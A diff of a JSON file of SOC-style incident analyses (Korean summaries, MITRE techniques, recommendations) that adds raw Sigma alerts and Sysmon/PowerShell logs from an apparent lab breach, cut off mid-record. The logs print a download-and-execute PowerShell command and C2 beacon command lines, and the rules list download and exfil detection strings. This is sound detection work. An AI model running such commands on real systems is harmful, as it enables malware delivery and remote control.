@@ -26,20 +26,105 @@
       "verdict": "true_positive",
       "alert_count": 1,
       "summary": "PowerShell 네트워크 조회 이후 압축 파일과 의심 실행 파일 생성 확인",
-      "rules": ["PowerShell Script Block With Network Retrieval"],
-      "techniques": ["T1059.001", "T1105"],
+      "rules": [
+        "PowerShell Script Block With Network Retrieval"
+      ],
+      "techniques": [
+        "T1059.001",
+        "T1105"
+      ],
       "findings": [
         "Invoke-WebRequest를 이용한 외부 압축 파일 조회",
         "AppData 하위 tmp.zip과 scvhost.exe 생성",
         "다운로드 직후 의심 실행 파일 실행"
       ],
-      "limitations": ["원격지 연결 성공 여부를 직접 확인할 네트워크 이벤트 부족"],
-      "recommendations": ["CLIENT2 호스트 격리", "scvhost.exe와 관련 파일 수집", "동일 사용자 계정 활동 검토"],
+      "limitations": [
+        "원격지 연결 성공 여부를 직접 확인할 네트워크 이벤트 부족"
+      ],
+      "recommendations": [
+        "CLIENT2 호스트 격리",
+        "scvhost.exe와 관련 파일 수집",
+        "동일 사용자 계정 활동 검토"
+      ],
       "timeline": [
-        {"timestamp": "2025-01-06T10:01:08.786Z", "event_code": "4104", "title": "PowerShell ScriptBlock", "detail": "Invoke-WebRequest를 이용한 압축 파일 조회"},
-        {"timestamp": "2025-01-06T10:01:13.986Z", "event_code": "11", "title": "tmp.zip 생성", "detail": "사용자 Roaming 경로에 압축 파일 생성"},
-        {"timestamp": "2025-01-06T10:03:04.532Z", "event_code": "11", "title": "scvhost.exe 생성", "detail": "시스템 프로세스와 유사한 이름의 실행 파일 생성"},
-        {"timestamp": "2025-01-06T10:03:44.504Z", "event_code": "1", "title": "scvhost.exe 실행", "detail": "C2 및 유출 페이지 인자를 포함한 프로세스 실행"}
+        {
+          "timestamp": "2025-01-06T10:01:08.786Z",
+          "event_code": "4104",
+          "title": "PowerShell ScriptBlock",
+          "detail": "Invoke-WebRequest를 이용한 압축 파일 조회"
+        },
+        {
+          "timestamp": "2025-01-06T10:01:13.986Z",
+          "event_code": "11",
+          "title": "tmp.zip 생성",
+          "detail": "사용자 Roaming 경로에 압축 파일 생성"
+        },
+        {
+          "timestamp": "2025-01-06T10:03:04.532Z",
+          "event_code": "11",
+          "title": "scvhost.exe 생성",
+          "detail": "시스템 프로세스와 유사한 이름의 실행 파일 생성"
+        },
+        {
+          "timestamp": "2025-01-06T10:03:44.504Z",
+          "event_code": "1",
+          "title": "scvhost.exe 실행",
+          "detail": "C2 및 유출 페이지 인자를 포함한 프로세스 실행"
+        }
+      ],
+      "raw_alerts": [
+        {
+          "alert_id": "sigma-1336fcd3f8637250f556f07d",
+          "as_of": "2025-01-06T10:01:08.786Z",
+          "scope": {
+            "window_start": "2025-01-06T09:00:00.000Z",
+            "window_end": "2025-01-06T14:00:00.000Z"
+          },
+          "rule": {
+            "id": "eac99b90-0565-46f2-9ea6-8941aa52c472",
+            "title": "PowerShell Script Block With Network Retrieval",
+            "logsource": {
+              "product": "windows",
+              "category": "ps_script"
+            },
+            "detection": {
+              "selection_event": {
+                "EventID": "4104"
+              },
+              "selection_retrieval": {
+                "ScriptBlockText|contains": [
+                  "Invoke-WebRequest",
+                  "DownloadString",
+                  "DownloadFile",
+                  "Start-BitsTransfer",
+                  "Net.WebClient",
+                  "HttpClient"
+                ]
+              },
+              "condition": "all of selection_*"
+            },
+            "level": "medium",
+            "falsepositives": [
+              "Approved software deployment and administrative download scripts",
+              "Package managers and enterprise bootstrap scripts"
+            ]
+          },
+          "event": {
+            "index": "dedale-winlogbeat-final-11pc-5h-set01",
+            "id": "2bc22980b62d92e183059baf6ce27a00c743b4c2d2b98e908a979503a478a1e9",
+            "timestamp": "2025-01-06T10:01:08.786Z",
+            "host": "CLIENT2.breach.local",
+            "fields": {
+              "event.code": "4104",
+              "winlog.channel": "Microsoft-Windows-PowerShell/Operational",
+              "message": "Creating Scriptblock text (1 of 1):\nInvoke-WebRequest -Uri 'http://172.19.1.1/Bank-of-Nuthington.zip' -UseBasicParsing -OutFile 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\tmp.zip' ; Expand-Archive -LiteralPath 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\tmp.zip' -DestinationPath 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\' ; Remove-Item 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\tmp.zip' -Force -Confirm:$false ; Start-Process -WorkingDirectory 'C:\\' -FilePath 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\scvhost.exe' -ArgumentList '--commands-page index.php --exfiltration-page login.php'\n\nScriptBlock ID: 245c330e-754a-4271-bd43-e382ef0fa66e\nPath: "
+            }
+          },
+          "matched_on": [
+            "EventID",
+            "ScriptBlockText"
+          ]
+        }
       ]
     },
     {
@@ -52,15 +137,175 @@
       "verdict": "true_positive",
       "alert_count": 2,
       "summary": "사용자 쓰기 경로의 위장 실행 파일과 C2 통신 인자 확인",
-      "rules": ["Unidentified Executable Started From User-Writable Directory", "System Process Name Or Lookalike From Unexpected Path"],
-      "techniques": ["T1036", "T1204"],
-      "findings": ["scvhost.exe가 AppData Roaming 경로에서 실행", "정상 svchost.exe와 유사한 파일명 사용", "명령·유출 페이지 인자 확인"],
-      "limitations": ["파일 해시 평판과 메모리 분석 결과 미포함"],
-      "recommendations": ["실행 파일 해시 확보", "프로세스 트리 보존", "동일 경로 실행 차단"],
+      "rules": [
+        "Unidentified Executable Started From User-Writable Directory",
+        "System Process Name Or Lookalike From Unexpected Path"
+      ],
+      "techniques": [
+        "T1036",
+        "T1204"
+      ],
+      "findings": [
+        "scvhost.exe가 AppData Roaming 경로에서 실행",
+        "정상 svchost.exe와 유사한 파일명 사용",
+        "명령·유출 페이지 인자 확인"
+      ],
+      "limitations": [
+        "파일 해시 평판과 메모리 분석 결과 미포함"
+      ],
+      "recommendations": [
+        "실행 파일 해시 확보",
+        "프로세스 트리 보존",
+        "동일 경로 실행 차단"
+      ],
       "timeline": [
-        {"timestamp": "2025-01-06T10:03:04.532Z", "event_code": "11", "title": "실행 파일 생성", "detail": "AppData Roaming 경로에 scvhost.exe 생성"},
-        {"timestamp": "2025-01-06T10:03:44.504Z", "event_code": "1", "title": "의심 프로세스 실행", "detail": "사용자 쓰기 가능 경로에서 실행"},
-        {"timestamp": "2025-01-06T10:03:45.018Z", "event_code": "3", "title": "네트워크 시도", "detail": "의심 프로세스의 외부 통신 정황"}
+        {
+          "timestamp": "2025-01-06T10:03:04.532Z",
+          "event_code": "11",
+          "title": "실행 파일 생성",
+          "detail": "AppData Roaming 경로에 scvhost.exe 생성"
+        },
+        {
+          "timestamp": "2025-01-06T10:03:44.504Z",
+          "event_code": "1",
+          "title": "의심 프로세스 실행",
+          "detail": "사용자 쓰기 가능 경로에서 실행"
+        },
+        {
+          "timestamp": "2025-01-06T10:03:45.018Z",
+          "event_code": "3",
+          "title": "네트워크 시도",
+          "detail": "의심 프로세스의 외부 통신 정황"
+        }
+      ],
+      "raw_alerts": [
+        {
+          "alert_id": "sigma-9edbeabc05fa0e03947d4120",
+          "as_of": "2025-01-06T10:03:44.504Z",
+          "scope": {
+            "window_start": "2025-01-06T09:00:00.000Z",
+            "window_end": "2025-01-06T14:00:00.000Z"
+          },
+          "rule": {
+            "id": "f69c2bc1-4595-4c67-b6a4-18a0d75a49de",
+            "title": "Unidentified Executable Started From User-Writable Directory",
+            "logsource": {
+              "product": "windows",
+              "category": "process_creation"
+            },
+            "detection": {
+              "selection_event": {
+                "EventID": "1"
+              },
+              "selection_user_path": {
+                "Image|contains": [
+                  "\\AppData\\Local\\Temp\\",
+                  "\\AppData\\Roaming\\",
+                  "\\Users\\Public\\",
+                  "\\Downloads\\",
+                  "\\Windows\\Temp\\"
+                ]
+              },
+              "selection_missing_metadata": {
+                "OriginalFileName": "-",
+                "Company": "-"
+              },
+              "condition": "all of selection_*"
+            },
+            "level": "medium",
+            "falsepositives": [
+              "Internally developed or portable software without Windows version metadata",
+              "Temporary executables created by approved installers and self-extracting packages"
+            ]
+          },
+          "event": {
+            "index": "dedale-winlogbeat-final-11pc-5h-set01",
+            "id": "f18c883dbd2a2ab2cf48f39f157af0445ee02a786155a725c0c9bb665ac0d7ab",
+            "timestamp": "2025-01-06T10:03:44.504Z",
+            "host": "CLIENT2.breach.local",
+            "fields": {
+              "event.code": "1",
+              "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+              "message": "Process Create:\nRuleName: -\nUtcTime: 2025-01-06 10:03:44.504\nProcessGuid: {416dd0c5-aa80-677b-6702-000000001100}\nProcessId: 10224\nImage: C:\\Users\\client2\\AppData\\Roaming\\scvhost\\scvhost.exe\nFileVersion: -\nDescription: -\nProduct: -\nCompany: -\nOriginalFileName: -\nCommandLine: \"C:\\Users\\client2\\AppData\\Roaming\\scvhost\\scvhost.exe\" --commands-page index.php --exfiltration-page login.php \nCurrentDirectory: C:\\\nUser: BREACH\\client2\nLogonGuid: {416dd0c5-8e4c-677b-8cb7-030000000000}\nLogonId: 0x3B78C\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=52D45A1E6A5679DD710A3546C13DBC4F5FC48F52,MD5=E3D0BC9A61D19A21F86F4C43B6DCB25F,SHA256=26C4EFED85103D0B6F7184EABA2F9F8A97994D56510F5933A6F2EB384A2BF3FB,IMPHASH=B4C6FFF030479AA3B12625BE67BF4914\nParentProcessGuid: {416dd0c5-a9ce-677b-3d02-000000001100}\nParentProcessId: 2768\nParentImage: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'http://172.19.1.1/Bank-of-Nuthington.zip' -UseBasicParsing -OutFile 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\tmp.zip' ; Expand-Archive -LiteralPath 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\tmp.zip' -DestinationPath 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\' ; Remove-Item 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\tmp.zip' -Force -Confirm:$false ; Start-Process -WorkingDirectory 'C:\\' -FilePath 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\scvhost.exe' -ArgumentList '--commands-page index.php --exfiltration-page login.php'\"\nParentUser: BREACH\\client2",
+              "process.command_line": "\"C:\\Users\\client2\\AppData\\Roaming\\scvhost\\scvhost.exe\" --commands-page index.php --exfiltration-page login.php ",
+              "process.entity_id": "{416dd0c5-aa80-677b-6702-000000001100}"
+            }
+          },
+          "matched_on": [
+            "EventID",
+            "Image",
+            "OriginalFileName",
+            "Company"
+          ]
+        },
+        {
+          "alert_id": "sigma-d3505d8c6456a38cc56a76ef",
+          "as_of": "2025-01-06T10:03:44.504Z",
+          "scope": {
+            "window_start": "2025-01-06T09:00:00.000Z",
+            "window_end": "2025-01-06T14:00:00.000Z"
+          },
+          "rule": {
+            "id": "32cef9cd-0256-46f3-a530-5a92f13d2cd4",
+            "title": "System Process Name Or Lookalike From Unexpected Path",
+            "logsource": {
+              "product": "windows",
+              "category": "process_creation"
+            },
+            "detection": {
+              "selection_event": {
+                "EventID": "1"
+              },
+              "selection_image": {
+                "Image|endswith": [
+                  "\\svchost.exe",
+                  "\\scvhost.exe",
+                  "\\svhost.exe",
+                  "\\svch0st.exe",
+                  "\\lsass.exe",
+                  "\\services.exe",
+                  "\\winlogon.exe",
+                  "\\csrss.exe",
+                  "\\csrsss.exe",
+                  "\\smss.exe",
+                  "\\spoolsv.exe",
+                  "\\conhost.exe",
+                  "\\taskhostw.exe"
+                ]
+              },
+              "filter_expected": {
+                "Image|contains": [
+                  "\\Windows\\System32\\",
+                  "\\Windows\\SysWOW64\\",
+                  "\\Windows\\WinSxS\\"
+                ]
+              },
+              "condition": "selection_event and selection_image and not filter_expected"
+            },
+            "level": "high",
+            "falsepositives": [
+              "Windows recovery and servicing paths not covered by the generic filter",
+              "Application test fixtures intentionally using system-like names"
+            ]
+          },
+          "event": {
+            "index": "dedale-winlogbeat-final-11pc-5h-set01",
+            "id": "f18c883dbd2a2ab2cf48f39f157af0445ee02a786155a725c0c9bb665ac0d7ab",
+            "timestamp": "2025-01-06T10:03:44.504Z",
+            "host": "CLIENT2.breach.local",
+            "fields": {
+              "event.code": "1",
+              "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+              "message": "Process Create:\nRuleName: -\nUtcTime: 2025-01-06 10:03:44.504\nProcessGuid: {416dd0c5-aa80-677b-6702-000000001100}\nProcessId: 10224\nImage: C:\\Users\\client2\\AppData\\Roaming\\scvhost\\scvhost.exe\nFileVersion: -\nDescription: -\nProduct: -\nCompany: -\nOriginalFileName: -\nCommandLine: \"C:\\Users\\client2\\AppData\\Roaming\\scvhost\\scvhost.exe\" --commands-page index.php --exfiltration-page login.php \nCurrentDirectory: C:\\\nUser: BREACH\\client2\nLogonGuid: {416dd0c5-8e4c-677b-8cb7-030000000000}\nLogonId: 0x3B78C\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=52D45A1E6A5679DD710A3546C13DBC4F5FC48F52,MD5=E3D0BC9A61D19A21F86F4C43B6DCB25F,SHA256=26C4EFED85103D0B6F7184EABA2F9F8A97994D56510F5933A6F2EB384A2BF3FB,IMPHASH=B4C6FFF030479AA3B12625BE67BF4914\nParentProcessGuid: {416dd0c5-a9ce-677b-3d02-000000001100}\nParentProcessId: 2768\nParentImage: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'http://172.19.1.1/Bank-of-Nuthington.zip' -UseBasicParsing -OutFile 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\tmp.zip' ; Expand-Archive -LiteralPath 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\tmp.zip' -DestinationPath 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\' ; Remove-Item 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\tmp.zip' -Force -Confirm:$false ; Start-Process -WorkingDirectory 'C:\\' -FilePath 'C:\\Users\\client2\\AppData\\Roaming\\scvhost\\scvhost.exe' -ArgumentList '--commands-page index.php --exfiltration-page login.php'\"\nParentUser: BREACH\\client2",
+              "process.command_line": "\"C:\\Users\\client2\\AppData\\Roaming\\scvhost\\scvhost.exe\" --commands-page index.php --exfiltration-page login.php ",
+              "process.entity_id": "{416dd0c5-aa80-677b-6702-000000001100}"
+            }
+          },
+          "matched_on": [
+            "EventID",
+            "Image"
+          ]
+        }
       ]
     },
     {
@@ -73,14 +318,174 @@
       "verdict": "true_positive",
       "alert_count": 2,
       "summary": "의심 실행 파일의 후속 프로세스와 명령 처리 동작 확인",
-      "rules": ["Unidentified Executable Started From User-Writable Directory", "User-Writable Executable With Network Command Options"],
-      "techniques": ["T1059", "T1105"],
-      "findings": ["동일 Entity ID 계열의 후속 프로세스 생성", "네트워크 명령 처리 옵션 유지", "정상 설치 경로와 무관한 실행"],
-      "limitations": ["원격 명령의 실제 응답 내용 미확인"],
-      "recommendations": ["자식 프로세스 전체 수집", "네트워크 세션 검토", "사용자 자격 증명 교체 검토"],
+      "rules": [
+        "Unidentified Executable Started From User-Writable Directory",
+        "User-Writable Executable With Network Command Options"
+      ],
+      "techniques": [
+        "T1059",
+        "T1105"
+      ],
+      "findings": [
+        "동일 Entity ID 계열의 후속 프로세스 생성",
+        "네트워크 명령 처리 옵션 유지",
+        "정상 설치 경로와 무관한 실행"
+      ],
+      "limitations": [
+        "원격 명령의 실제 응답 내용 미확인"
+      ],
+      "recommendations": [
+        "자식 프로세스 전체 수집",
+        "네트워크 세션 검토",
+        "사용자 자격 증명 교체 검토"
+      ],
       "timeline": [
-        {"timestamp": "2025-01-06T10:04:12.144Z", "event_code": "1", "title": "후속 프로세스", "detail": "scvhost.exe 계열의 추가 실행"},
-        {"timestamp": "2025-01-06T10:04:13.021Z", "event_code": "7", "title": "이미지 로드", "detail": "의심 프로세스 모듈 로드"}
+        {
+          "timestamp": "2025-01-06T10:04:12.144Z",
+          "event_code": "1",
+          "title": "후속 프로세스",
+          "detail": "scvhost.exe 계열의 추가 실행"
+        },
+        {
+          "timestamp": "2025-01-06T10:04:13.021Z",
+          "event_code": "7",
+          "title": "이미지 로드",
+          "detail": "의심 프로세스 모듈 로드"
+        }
+      ],
+      "raw_alerts": [
+        {
+          "alert_id": "sigma-3c1f7926d716e83780f502d2",
+          "as_of": "2025-01-06T10:04:47.381Z",
+          "scope": {
+            "window_start": "2025-01-06T09:00:00.000Z",
+            "window_end": "2025-01-06T14:00:00.000Z"
+          },
+          "rule": {
+            "id": "f69c2bc1-4595-4c67-b6a4-18a0d75a49de",
+            "title": "Unidentified Executable Started From User-Writable Directory",
+            "logsource": {
+              "product": "windows",
+              "category": "process_creation"
+            },
+            "detection": {
+              "selection_event": {
+                "EventID": "1"
+              },
+              "selection_user_path": {
+                "Image|contains": [
+                  "\\AppData\\Local\\Temp\\",
+                  "\\AppData\\Roaming\\",
+                  "\\Users\\Public\\",
+                  "\\Downloads\\",
+                  "\\Windows\\Temp\\"
+                ]
+              },
+              "selection_missing_metadata": {
+                "OriginalFileName": "-",
+                "Company": "-"
+              },
+              "condition": "all of selection_*"
+            },
+            "level": "medium",
+            "falsepositives": [
+              "Internally developed or portable software without Windows version metadata",
+              "Temporary executables created by approved installers and self-extracting packages"
+            ]
+          },
+          "event": {
+            "index": "dedale-winlogbeat-final-11pc-5h-set01",
+            "id": "5cc2ec7bf0adff328d57abdb4bfe9844da2cf229794281aa4219a41de53daa58",
+            "timestamp": "2025-01-06T10:04:47.381Z",
+            "host": "CLIENT2.breach.local",
+            "fields": {
+              "event.code": "1",
+              "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+              "message": "Process Create:\nRuleName: -\nUtcTime: 2025-01-06 10:04:47.381\nProcessGuid: {416dd0c5-aabf-677b-6d02-000000001100}\nProcessId: 7328\nImage: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe\nFileVersion: -\nDescription: -\nProduct: -\nCompany: -\nOriginalFileName: -\nCommandLine: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.html --exfiltration-page login.html\nCurrentDirectory: C:\\Users\\client2\\AppData\\Local\\Temp\\\nUser: BREACH\\client2\nLogonGuid: {416dd0c5-8e4c-677b-8cb7-030000000000}\nLogonId: 0x3B78C\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=06D5FCE31C920DBF6B8E2C069C661020D269FD00,MD5=5651BB08D3D36263960E25E3969F73AD,SHA256=F572630D03AC493AB8BE3F756A4D55B9376DE155B37ADB2A98ADD51AE046A194,IMPHASH=0B5552DCCD9D0A834CEA55C0C8FC05BE\nParentProcessGuid: {00000000-0000-0000-0000-000000000000}\nParentProcessId: 10224\nParentImage: -\nParentCommandLine: -\nParentUser: -",
+              "process.command_line": "C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.html --exfiltration-page login.html",
+              "process.entity_id": "{416dd0c5-aabf-677b-6d02-000000001100}"
+            }
+          },
+          "matched_on": [
+            "EventID",
+            "Image",
+            "OriginalFileName",
+            "Company"
+          ]
+        },
+        {
+          "alert_id": "sigma-dd4fbfded89682c01cc29435",
+          "as_of": "2025-01-06T10:04:47.381Z",
+          "scope": {
+            "window_start": "2025-01-06T09:00:00.000Z",
+            "window_end": "2025-01-06T14:00:00.000Z"
+          },
+          "rule": {
+            "id": "ff58d638-aa58-41f0-99c3-383b2c9a1ddd",
+            "title": "User-Writable Executable With Network Command Options",
+            "logsource": {
+              "product": "windows",
+              "category": "process_creation"
+            },
+            "detection": {
+              "selection_event": {
+                "EventID": "1"
+              },
+              "selection_user_path": {
+                "Image|contains": [
+                  "\\AppData\\Local\\Temp\\",
+                  "\\AppData\\Roaming\\",
+                  "\\Users\\Public\\",
+                  "\\Downloads\\",
+                  "\\Windows\\Temp\\"
+                ]
+              },
+              "selection_network": {
+                "CommandLine|contains": [
+                  "http://",
+                  "https://",
+                  "ftp://"
+                ]
+              },
+              "selection_control_option": {
+                "CommandLine|contains": [
+                  "--command",
+                  "--c2",
+                  "--callback",
+                  "--beacon",
+                  "--fetch",
+                  "--exfil",
+                  "--interval",
+                  "commands-page",
+                  "communication-start"
+                ]
+              },
+              "condition": "all of selection_*"
+            },
+            "level": "high",
+            "falsepositives": [
+              "Portable developer tools and approved agents with explicit network-control options"
+            ]
+          },
+          "event": {
+            "index": "dedale-winlogbeat-final-11pc-5h-set01",
+            "id": "5cc2ec7bf0adff328d57abdb4bfe9844da2cf229794281aa4219a41de53daa58",
+            "timestamp": "2025-01-06T10:04:47.381Z",
+            "host": "CLIENT2.breach.local",
+            "fields": {
+              "event.code": "1",
+              "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+              "message": "Process Create:\nRuleName: -\nUtcTime: 2025-01-06 10:04:47.381\nProcessGuid: {416dd0c5-aabf-677b-6d02-000000001100}\nProcessId: 7328\nImage: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe\nFileVersion: -\nDescription: -\nProduct: -\nCompany: -\nOriginalFileName: -\nCommandLine: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.html --exfiltration-page login.html\nCurrentDirectory: C:\\Users\\client2\\AppData\\Local\\Temp\\\nUser: BREACH\\client2\nLogonGuid: {416dd0c5-8e4c-677b-8cb7-030000000000}\nLogonId: 0x3B78C\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=06D5FCE31C920DBF6B8E2C069C661020D269FD00,MD5=5651BB08D3D36263960E25E3969F73AD,SHA256=F572630D03AC493AB8BE3F756A4D55B9376DE155B37ADB2A98ADD51AE046A194,IMPHASH=0B5552DCCD9D0A834CEA55C0C8FC05BE\nParentProcessGuid: {00000000-0000-0000-0000-000000000000}\nParentProcessId: 10224\nParentImage: -\nParentCommandLine: -\nParentUser: -",
+              "process.command_line": "C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.html --exfiltration-page login.html",
+              "process.entity_id": "{416dd0c5-aabf-677b-6d02-000000001100}"
+            }
+          },
+          "matched_on": [
+            "EventID",
+            "Image",
+            "CommandLine"
+          ]
+        }
       ]
     },
     {
@@ -93,14 +498,174 @@
       "verdict": "true_positive",
       "alert_count": 2,
       "summary": "사용자 경로 실행 파일의 반복 실행과 시스템 도구 연계 확인",
-      "rules": ["Unidentified Executable Started From User-Writable Directory", "User-Writable Parent Spawns Shell Or System Control Utility"],
-      "techniques": ["T1059.003", "T1218"],
-      "findings": ["사용자 경로 프로세스가 시스템 제어 도구 실행", "부모·자식 관계가 동일 공격 흐름과 연결", "짧은 시간 내 반복된 후속 행위"],
-      "limitations": ["실행 명령의 전체 표준 출력 미수집"],
-      "recommendations": ["관련 프로세스 트리 보존", "사용자 프로필 경로 검사", "호스트 격리 후 포렌식 수행"],
+      "rules": [
+        "Unidentified Executable Started From User-Writable Directory",
+        "User-Writable Parent Spawns Shell Or System Control Utility"
+      ],
+      "techniques": [
+        "T1059.003",
+        "T1218"
+      ],
+      "findings": [
+        "사용자 경로 프로세스가 시스템 제어 도구 실행",
+        "부모·자식 관계가 동일 공격 흐름과 연결",
+        "짧은 시간 내 반복된 후속 행위"
+      ],
+      "limitations": [
+        "실행 명령의 전체 표준 출력 미수집"
+      ],
+      "recommendations": [
+        "관련 프로세스 트리 보존",
+        "사용자 프로필 경로 검사",
+        "호스트 격리 후 포렌식 수행"
+      ],
       "timeline": [
-        {"timestamp": "2025-01-06T10:05:03.902Z", "event_code": "1", "title": "반복 실행", "detail": "동일 사용자 경로에서 의심 프로세스 실행"},
-        {"timestamp": "2025-01-06T10:05:04.241Z", "event_code": "1", "title": "시스템 도구 실행", "detail": "의심 부모에서 Windows 제어 도구 생성"}
+        {
+          "timestamp": "2025-01-06T10:05:03.902Z",
+          "event_code": "1",
+          "title": "반복 실행",
+          "detail": "동일 사용자 경로에서 의심 프로세스 실행"
+        },
+        {
+          "timestamp": "2025-01-06T10:05:04.241Z",
+          "event_code": "1",
+          "title": "시스템 도구 실행",
+          "detail": "의심 부모에서 Windows 제어 도구 생성"
+        }
+      ],
+      "raw_alerts": [
+        {
+          "alert_id": "sigma-0cf49612b261f7245f814a9f",
+          "as_of": "2025-01-06T10:05:02.220Z",
+          "scope": {
+            "window_start": "2025-01-06T09:00:00.000Z",
+            "window_end": "2025-01-06T14:00:00.000Z"
+          },
+          "rule": {
+            "id": "f69c2bc1-4595-4c67-b6a4-18a0d75a49de",
+            "title": "Unidentified Executable Started From User-Writable Directory",
+            "logsource": {
+              "product": "windows",
+              "category": "process_creation"
+            },
+            "detection": {
+              "selection_event": {
+                "EventID": "1"
+              },
+              "selection_user_path": {
+                "Image|contains": [
+                  "\\AppData\\Local\\Temp\\",
+                  "\\AppData\\Roaming\\",
+                  "\\Users\\Public\\",
+                  "\\Downloads\\",
+                  "\\Windows\\Temp\\"
+                ]
+              },
+              "selection_missing_metadata": {
+                "OriginalFileName": "-",
+                "Company": "-"
+              },
+              "condition": "all of selection_*"
+            },
+            "level": "medium",
+            "falsepositives": [
+              "Internally developed or portable software without Windows version metadata",
+              "Temporary executables created by approved installers and self-extracting packages"
+            ]
+          },
+          "event": {
+            "index": "dedale-winlogbeat-final-11pc-5h-set01",
+            "id": "c6a504b65b801531473d70013636c6ad17aa6d516c80f694d395b673021e6367",
+            "timestamp": "2025-01-06T10:05:02.220Z",
+            "host": "CLIENT2.breach.local",
+            "fields": {
+              "event.code": "1",
+              "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
+              "message": "Process Create:\nRuleName: -\nUtcTime: 2025-01-06 10:05:02.220\nProcessGuid: {416dd0c5-aace-677b-6e02-000000001100}\nProcessId: 8660\nImage: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe\nFileVersion: -\nDescription: -\nProduct: -\nCompany: -\nOriginalFileName: -\nCommandLine: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.html --exfiltration-page login.html\nCurrentDirectory: C:\\Users\\client2\\AppData\\Local\\Temp\\\nUser: BREACH\\client2\nLogonGuid: {416dd0c5-8e4c-677b-8cb7-030000000000}\nLogonId: 0x3B78C\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=06D5FCE31C920DBF6B8E2C069C661020D269FD00,MD5=5651BB08D3D36263960E25E3969F73AD,SHA256=F572630D03AC493AB8BE3F756A4D55B9376DE155B37ADB2A98ADD51AE046A194,IMPHASH=0B5552DCCD9D0A834CEA55C0C8FC05BE\nParentProcessGuid: {416dd0c5-aabf-677b-6d02-000000001100}\nParentProcessId: 7328\nParentImage: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe\nParentCommandLine: C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.html --exfiltration-page login.html\nParentUser: BREACH\\client2",
+              "process.command_line": "C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe --fetch-command-url https://172.19.0.2:443  --c2-communication-starttime \"11:00\" --c2-communication-interval 86400 --c2-communication-variable-delay 3600 --commands-page index.html --exfiltration-page login.html",
+              "process.entity_id": "{416dd0c5-aace-677b-6e02-000000001100}"
+            }
+          },
+          "matched_on": [
+            "EventID",
+            "Image",
+            "OriginalFileName",
+            "Company"
+          ]
+        },
+        {
+          "alert_id": "sigma-de9f1d700e39b49e8681e152",
+          "as_of": "2025-01-06T10:05:02.220Z",
+          "scope": {
+            "window_start": "2025-01-06T09:00:00.000Z",
+            "window_end": "2025-01-06T14:00:00.000Z"
+          },
+          "rule": {
+            "id": "ff58d638-aa58-41f0-99c3-383b2c9a1ddd",
+            "title": "User-Writable Executable With Network Command Options",
+            "logsource": {
+              "product": "windows",
+              "category": "process_creation"
+            },
+            "detection": {
+              "selection_event": {
+                "EventID": "1"
+              },
+              "selection_user_path": {
+                "Image|contains": [
+                  "\\AppData\\Local\\Temp\\",
+                  "\\AppData\\Roaming\\",
+                  "\\Users\\Public\\",
+                  "\\Downloads\\",
+                  "\\Windows\\Temp\\"
+                ]
+              },
+              "selection_network": {
+                "CommandLine|contains": [
+                  "http://",
+                  "https://",
+                  "ftp://"
+                ]
+              },
+              "selection_control_option": {
+                "CommandLine|contains": [
+                  "--command",
+                  "--c2",
+                  "--callback",
+                  "--beacon",
+                  "--fetch",
+                  "--exfil",
+                  "--interval",
+                  "commands-page",
+                  "communication-start"
+                ]
+              },
+              "condition": "all of selection_*"
+            },
+            "level": "high",
+            "falsepositives": [
+              "Portable developer tools and approved agents with explicit network-control options"
+            ]
+          },
+          "event": {
+            "index": "dedale-winlogbeat-final-11pc-5h-set01",
